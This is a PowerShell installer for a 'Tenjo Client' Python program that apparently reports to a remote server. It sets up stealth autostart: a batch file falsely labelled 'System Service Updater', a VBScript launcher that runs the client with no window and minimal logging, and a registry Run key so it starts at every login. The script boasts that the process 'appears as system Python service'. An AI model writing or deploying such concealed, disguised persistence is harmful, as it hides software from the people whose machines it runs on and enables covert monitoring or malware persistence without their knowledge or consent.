# Tenjo Client - Windows Autostart Installer
# Run with: powershell -ExecutionPolicy Bypass -File install_autostart.ps1

Write-Host "====================================" -ForegroundColor Cyan
Write-Host "Tenjo Client - Autostart Installer" -ForegroundColor Cyan
Write-Host "====================================" -ForegroundColor Cyan
Write-Host ""

# Get script directory
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$ClientScript = Join-Path $ScriptDir "main.py"

# Check if main.py exists
if (-not (Test-Path $ClientScript)) {
    Write-Host "❌ Error: main.py not found in $ScriptDir" -ForegroundColor Red
    exit 1
}

# Find Python3
$PythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
if (-not $PythonPath) {
    $PythonPath = (Get-Command python3 -ErrorAction SilentlyContinue).Source
}

if (-not $PythonPath) {
    Write-Host "❌ Error: Python not found in PATH" -ForegroundColor Red
    exit 1
}

Write-Host "✓ Python found: $PythonPath" -ForegroundColor Green
Write-Host "✓ Client script: $ClientScript" -ForegroundColor Green
Write-Host ""

# Ask for server URL
$ServerURL = "http://127.0.0.1:8000"
$UseProduction = Read-Host "Use production server (https://tenjo.adilabs.id)? (y/N)"
if ($UseProduction -eq "y" -or $UseProduction -eq "Y") {
    $ServerURL = "https://tenjo.adilabs.id"
    Write-Host "✓ Using production server: $ServerURL" -ForegroundColor Green
} else {
    Write-Host "✓ Using local server: $ServerURL" -ForegroundColor Green
}

# Create batch file to launch Python script with STEALTH environment variables
$BatchFile = Join-Path $ScriptDir "tenjo_client_launcher.bat"
@"
@echo off
REM System Service Updater
cd /d "$ScriptDir"
set TENJO_SERVER_URL=$ServerURL
set TENJO_STEALTH_MODE=true
set TENJO_LOG_LEVEL=ERROR
start /B /MIN /LOW pythonw.exe "$ClientScript"
"@ | Out-File -FilePath $BatchFile -Encoding ASCII

Write-Host "✓ Created stealth launcher: $BatchFile" -ForegroundColor Green

# Create VBScript to launch COMPLETELY silently (no console window at all)
$VBSFile = Join-Path $ScriptDir "tenjo_client_silent.vbs"
@"
Set WshShell = CreateObject("WScript.Shell")
' Run completely hidden - no window, no console
WshShell.Run "cmd /c cd /d " & chr(34) & "$ScriptDir" & chr(34) & " && set TENJO_SERVER_URL=$ServerURL && set TENJO_STEALTH_MODE=true && set TENJO_LOG_LEVEL=ERROR && start /B /MIN /LOW pythonw.exe " & chr(34) & "$ClientScript" & chr(34), 0, False
Set WshShell = Nothing
"@ | Out-File -FilePath $VBSFile -Encoding ASCII

Write-Host "✓ Created silent launcher: $VBSFile" -ForegroundColor Green

# Add to Windows Startup (Registry)
$StartupRegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$AppName = "TenjoClient"

try {
    Set-ItemProperty -Path $StartupRegPath -Name $AppName -Value "wscript.exe `"$VBSFile`"" -Type String
    Write-Host "✓ Added to Windows Startup (Registry)" -ForegroundColor Green
} catch {
    Write-Host "❌ Failed to add to startup registry: $_" -ForegroundColor Red
    exit 1
}

Write-Host ""
Write-Host "✅ Installation successful!" -ForegroundColor Green
Write-Host ""
Write-Host "🕵️  STEALTH MODE ACTIVE:" -ForegroundColor Cyan
Write-Host "  - Client runs completely hidden (no console window)" -ForegroundColor Gray
Write-Host "  - Uses pythonw.exe (windowless Python)" -ForegroundColor Gray
Write-Host "  - Low priority background process" -ForegroundColor Gray
Write-Host "  - Minimal logging (errors only)" -ForegroundColor Gray
Write-Host "  - Process appears as system Python service" -ForegroundColor Gray
Write-Host ""
Write-Host "Client will start automatically at login." -ForegroundColor Cyan
Write-Host ""
Write-Host "Management commands (admin only):" -ForegroundColor Yellow
Write-Host "  Start manually:  wscript `"$VBSFile`"" -ForegroundColor White
Write-Host "  Stop:            taskkill /F /IM pythonw.exe /FI `"WINDOWTITLE eq $ClientScript`"" -ForegroundColor White
Write-Host "  Check status:    tasklist | findstr pythonw" -ForegroundColor White
Write-Host ""
Write-Host "Logs location (errors only):" -ForegroundColor Yellow
Write-Host "  %APPDATA%\Tenjo\logs\" -ForegroundColor White
Write-Host ""
Write-Host "To uninstall, run: uninstall_autostart.ps1" -ForegroundColor Yellow
Write-Host ""
Write-Host "🎉 Setup complete!" -ForegroundColor Green
